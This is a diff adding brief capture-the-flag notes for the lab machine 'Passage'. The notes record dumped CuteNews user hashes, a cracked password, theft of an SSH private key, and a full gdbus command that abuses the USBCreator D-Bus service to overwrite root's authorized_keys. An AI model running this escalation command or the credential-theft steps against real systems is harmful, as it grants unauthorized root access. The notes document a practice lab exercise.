@@ -1,0 +1,32 @@
+[*] Users:
+
+admin: nadav@passage.htb
+paul-coles: paul@passage.htb
+
+[+] CuteNews RCE vulnerability.
+
+[-] CuteNews/cdata/conf.php:
+
+hash: cd46d0731b41d6930b31df1097062197
+crypt_salt: 731555aa24389a30b3d0e5dfb9730baffc2c97a2b07493c7bed8e4317657bde0
+
+[*] Dumped CuteNews/cdata/users/.
+
+[*] Hashes:
+
+paul:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+nadav:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+
+[+] Cracked paul's hash using CrackStation: atlanta1.
+
+[+] Got user.txt!
+
+[+] Got paul's id_rsa key.
+
+[+] SSHd as nadav using paul's id_rsa key.
+
+[+] .viminfo mentions com.ubuntu.USBCreator.conf --> https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
+
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true
+
+[+] Got root.txt!
